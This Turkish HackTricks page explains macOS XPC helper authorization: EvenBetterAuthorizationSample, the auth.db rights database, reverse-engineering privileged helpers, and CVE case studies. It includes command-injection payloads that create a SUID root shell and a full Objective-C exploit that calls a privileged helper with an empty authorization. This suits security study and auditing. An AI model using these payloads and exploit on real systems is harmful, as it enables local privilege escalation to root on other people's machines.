# macOS XPC Yetkilendirmesi

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Yetkilendirmesi

Apple ayrıca, bağlanan process'in **açığa çıkarılmış bir XPC method'unu çağırma izinlerine sahip olup olmadığını** doğrulamak için başka bir yöntem sunar.

Bir uygulamanın **privileged bir kullanıcı olarak action'lar gerçekleştirmesi** gerektiğinde, uygulamayı privileged bir kullanıcı olarak çalıştırmak yerine genellikle root olarak bir HelperTool yükler. Bu HelperTool, uygulamadan çağrılabilen ve bu action'ları gerçekleştiren bir XPC service olarak çalışır. Ancak service'i çağıran uygulamanın yeterli authorization'a sahip olması gerekir.

### ShouldAcceptNewConnection her zaman YES

Buna [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) içinde bir örnek bulunabilir. `App/AppDelegate.m` dosyasında **HelperTool'a bağlanmaya** çalışır. `HelperTool/HelperTool.m` dosyasındaki **`shouldAcceptNewConnection`** function'ı ise daha önce belirtilen gereksinimlerin hiçbirini **kontrol etmez**. Her zaman YES döndürür:<sup>[1]</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Daha fazla bilgi ve bu check'in doğru şekilde nasıl yapılandırılacağı için:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Uygulama yetkileri

Ancak, **HelperTool'dan bir method çağrıldığında bazı yetkilendirme işlemleri gerçekleştirilir**.

`App/AppDelegate.m` içindeki **`applicationDidFinishLaunching`** function'ı, app başladıktan sonra boş bir authorization reference oluşturur. Bu işlem her zaman başarılı olmalıdır.\
Ardından, **`setupAuthorizationRights`** çağrısını yaparak bu authorization reference'a **bazı haklar eklemeye** çalışır:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m` içindeki `setupAuthorizationRights` işlevi, uygulamanın haklarını auth database `/var/db/auth.db` içine kaydeder. Henüz database'de bulunmayan hakları eklediğine dikkat edin:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
`enumerateRightsUsingBlock` işlevi, `commandInfo` içinde tanımlanan uygulama izinlerini almak için kullanılır:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Bu, bu sürecin sonunda `commandInfo` içinde tanımlanan izinlerin `/var/db/auth.db` içinde depolanacağı anlamına gelir. Burada **kimlik doğrulaması gerektirecek** **her method** için **permission name** ve **`kCommandKeyAuthRightDefault`** değerlerini bulabileceğinize dikkat edin. İkincisi, **bu right'ı kimlerin alabileceğini belirtir**.

Bir right'a kimlerin erişebileceğini belirtmek için farklı scope'lar vardır. Bunlardan bazıları [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) içinde tanımlanmıştır ( [tamamını burada bulabilirsiniz](https://www.dssw.co.uk/reference/authorization-rights/) ), ancak özetle:

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Herkes</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Hiç kimse</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Mevcut kullanıcının admin olması gerekir (admin grubunun içinde)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Kullanıcıdan kimlik doğrulaması yapması istenir.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Kullanıcıdan kimlik doğrulaması yapması istenir. Kullanıcının admin olması gerekir (admin grubunun içinde)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Kuralları belirtir</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Right hakkında bazı ek yorumlar belirtir</td></tr></tbody></table>

### Rights Verification

`HelperTool/HelperTool.m` içindeki **`readLicenseKeyAuthorization`** function'ı, **`checkAuthorization`** function'ını çağırarak çağıranın **bu method'u çalıştırma** yetkisine sahip olup olmadığını kontrol eder. Bu function, çağıran process tarafından gönderilen **authData**'nın **doğru formatta** olup olmadığını kontrol eder ve ardından belirli method'u çağırmak için **right'ı almak üzere ne gerektiğini** kontrol eder. Her şey yolunda giderse **döndürülen `error` değeri `nil` olur**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
`authorizationRightForCommand` fonksiyonunun bu metodu çağırmak için gerekli **hakka sahip olma gereksinimlerini kontrol etmek** amacıyla yalnızca daha önce bahsedilen **`commandInfo`** nesnesini kontrol ettiğini unutmayın. Ardından, fonksiyonu çağırmak için **haklara sahip olup olmadığını** kontrol etmek üzere **`AuthorizationCopyRights`** fonksiyonunu çağırır (flags değerlerinin kullanıcıyla etkileşime izin verdiğini unutmayın).

Bu durumda, `readLicenseKeyAuthorization` fonksiyonunu çağırmak için `kCommandKeyAuthRightDefault`, `@kAuthorizationRuleClassAllow` olarak tanımlanmıştır. Bu nedenle **herkes onu çağırabilir**.

### DB Bilgileri

Bu bilgilerin `/var/db/auth.db` konumunda saklandığından bahsedilmişti. Saklanan tüm kuralları şu komutla listeleyebilirsiniz:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Ardından, yetkiye kimlerin erişebileceğini şu şekilde okuyabilirsiniz:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### İzin verici haklar

**tüm izin yapılandırmalarını** [**burada**](https://www.dssw.co.uk/reference/authorization-rights/) bulabilirsiniz, ancak kullanıcı etkileşimi gerektirmeyecek kombinasyonlar şunlardır:

1. **'authenticate-user': 'false'**
- Bu, en doğrudan anahtardır. `false` olarak ayarlanırsa kullanıcının bu hakkı elde etmek için kimlik doğrulaması sağlaması gerekmediğini belirtir.
- Bu, **aşağıdaki 2 seçenekten biriyle veya kullanıcının üye olması gereken bir grup belirtilerek** birlikte kullanılır.
2. **'allow-root': 'true'**
- Bir kullanıcı root kullanıcısı olarak çalışıyorsa (root kullanıcısının yükseltilmiş izinleri vardır) ve bu anahtar `true` olarak ayarlanmışsa, root kullanıcısı ek kimlik doğrulaması olmadan potansiyel olarak bu hakkı elde edebilir. Ancak genellikle root kullanıcı durumuna ulaşmak zaten kimlik doğrulaması gerektirdiğinden, çoğu kullanıcı için bu bir "kimlik doğrulaması yok" senaryosu değildir.
3. **'session-owner': 'true'**
- `true` olarak ayarlanırsa, oturumun sahibi (o anda oturum açmış kullanıcı) bu hakkı otomatik olarak elde eder. Kullanıcı zaten oturum açmışsa bu, ek kimlik doğrulamasını atlayabilir.
4. **'shared': 'true'**
- Bu anahtar kimlik doğrulaması olmadan hak vermez. Bunun yerine `true` olarak ayarlanırsa, hak doğrulandıktan sonra her birinin yeniden kimlik doğrulaması yapmasına gerek kalmadan birden fazla process arasında paylaşılabileceği anlamına gelir. Ancak diğer anahtarlarla, örneğin `'authenticate-user': 'false'` ile birlikte kullanılmadığı sürece hakkın ilk kez verilmesi yine kimlik doğrulaması gerektirir.

İlgi çekici hakları almak için [**bu scripti**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) kullanabilirsiniz:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass Case Studies

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Ayrıcalıklı Mach service `com.acustica.HelperTool` her bağlantıyı kabul eder ve `checkAuthorization:` rutini `AuthorizationCopyRights(NULL, …)` çağrısı yaptığından, herhangi bir 32 baytlık blob geçerli olur. Ardından `executeCommand:authorization:withReply:`, saldırgan tarafından kontrol edilen virgülle ayrılmış dizeleri root olarak `NSTask`'e aktarır ve şu tür payload'ları mümkün kılar:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
trivially create a SUID root shell. Details in [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[6]</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Listener her zaman YES döndürür ve aynı NULL `AuthorizationCopyRights` pattern’i `checkAuthorization:` içinde de görülür. `exchangeAppWithReply:` saldırgan girdisini iki kez bir `system()` string’ine birleştirir; bu nedenle `appPath` içine shell metacharacter’ları (ör. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) enjekte etmek, Mach service `com.plugin-alliance.pa-installationhelper` üzerinden root code execution sağlar. Daha fazla bilgi [burada](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[7]</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Bir audit çalıştırıldığında `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` oluşturulur, `com.jamf.complianceeditor.helper` Mach service’i açığa çıkarılır ve caller’ın `AuthorizationExternalForm` veya code signature’ı doğrulanmadan `-executeScriptAt:arguments:then:` export edilir. Trivial bir exploit boş bir reference için `AuthorizationCreate` çağırır, `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` ile bağlanır ve root olarak arbitrary binary’ler çalıştırmak için method’u çağırır. Tam reversing notları (PoC ile birlikte) [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html) içinde. <sup>[4]</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 ve 7.4.0–7.4.2, authorization gate’leri bulunmayan privileged bir helper’a ulaşan crafted XPC message’larını kabul ediyordu. Helper kendi privileged `AuthorizationRef` değerine güvendiği için service’e message gönderebilen herhangi bir local user, helper’ı root olarak arbitrary configuration changes veya commands çalıştırmaya zorlayabiliyordu. Ayrıntılar [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/) içinde.<sup>[5]</sup>

#### Rapid triage tips

- Bir app hem GUI hem de helper içerdiğinde, code requirements’larını karşılaştırın ve `shouldAcceptNewConnection` listener’ı `-setCodeSigningRequirement:` ile lock ediyor mu (veya `SecCodeCopySigningInformation` doğrulaması yapıyor mu) kontrol edin. Eksik kontroller genellikle Jamf vakasındaki gibi CWE-863 senaryolarına yol açar. Hızlı bir inceleme şöyle görünür:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- helper'ın yetkilendirdiğini düşündüğü şey ile client'ın sağladığı şeyi karşılaştırın. Reverse engineering yaparken `AuthorizationCopyRights` üzerinde durun ve `AuthorizationRef`'in helper'ın kendi privileged context'inden değil, client tarafından sağlanan `AuthorizationCreateFromExternalForm` üzerinden geldiğini doğrulayın; aksi hâlde yukarıdaki vakalara benzer bir CWE-863 pattern'i bulmuş olabilirsiniz.

## Authorization'ı Reverse Engineering

### EvenBetterAuthorization kullanılıp kullanılmadığını kontrol etme

Şu function'ı bulursanız: **`[HelperTool checkAuthorization:command:]`**, process'in daha önce bahsedilen authorization şemasını kullanıyor olması muhtemeldir:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Bu function `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` gibi function'ları çağırıyorsa **[EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154)** kullanıyor demektir.

Herhangi bir user interaction olmadan privileged bir action çağırmak için permission elde etmenin mümkün olup olmadığını görmek üzere **`/var/db/auth.db`** dosyasını kontrol edin.

### Protocol Communication

Ardından, XPC service ile communication kurabilmek için protocol şemasını bulmanız gerekir.

**`shouldAcceptNewConnection`** function'ı export edilen protocol'ü gösterir:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Bu durumda, EvenBetterAuthorizationSample'dakiyle aynısına sahibiz; [**bu satırı kontrol edin**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Kullanılan protocol'ün adını bildiğinizde, şu komutla **header tanımını dump etmek** mümkündür:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Son olarak, onunla iletişim kurabilmek için **exposed Mach Service’ın adını** bilmemiz gerekiyor. Bunu bulmanın birkaç yolu vardır:

- Kullanılan Mach Service’ı görebileceğiniz **`[HelperTool init]`** içinde:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist içinde:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Örneği

Bu örnekte şunlar oluşturulur:

- İşlevlerle birlikte protocol tanımı
- Erişim istemek için kullanılacak boş bir auth
- XPC service bağlantısı
- Bağlantı başarılıysa işleve yapılan bir çağrı
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Kötüye Kullanılan Diğer XPC privilege helper'ları

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[8]</sup>

## Referanslar

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([GitHub mirror](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Jamf Compliance Editor Privilege Escalation](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: FortiClient Mac Privilege Escalation Flaw](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Acustica Audio HelperTool XPC Service Local Privilege Escalation in Aquarius Desktop on macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Plugin Alliance InstallationHelper XPC Service Local Privilege Escalation](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Apple EndpointSecurity framework Privilege Escalation (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

{{#include ../../../../../banners/hacktricks-training.md}}
